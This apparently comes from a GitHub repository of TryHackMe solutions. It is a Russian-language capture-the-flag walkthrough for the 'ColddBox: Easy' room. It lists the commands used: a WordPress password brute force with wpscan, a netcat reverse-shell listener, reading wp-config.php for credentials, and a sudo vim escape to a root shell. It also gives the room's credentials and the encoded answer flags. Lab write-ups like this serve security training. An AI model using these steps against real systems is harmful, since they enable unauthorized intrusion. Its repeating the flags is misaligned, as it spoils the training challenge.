[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [ColddBox: Easy](https://tryhackme.com/r/room/colddboxeasy) 

Всего 1 заданиe:
## Задание 1
Сможете ли вы получить доступ и получить оба флага ?

Удачи!.

Автор Марти из Hixec.

Сомнения и/или помощь в сообществе Hixec.

Изображение миниатюры предоставлено Freepik с  сайта www.flaticon.es

### Ответьте на вопросы ниже
пользователь.txt
```commandline
nmap -A -O -sC -sV -p- <IP>
wpscan --url http://<IP>/ -e u -P /usr/share/wordlists/rockyou.txt
# c0ldd:9876543210
rlwrap nc -nlvp 4444
python3 -c "import pty;pty.spawn('/bin/bash')"
ls -la
cat user.txt
ls /var/www/html
cat wp-config.php
ssh c0ldd@<IP> -p 4512
cat user.txt 
cat user.txt | base64 -d
```
```commandline
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```
корень.txt
```commandline
sudo -l
sudo /usr/bin/vim
:!/bin/bash

cd /root/
cat root.txt | base64 -d
```
```commandline
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)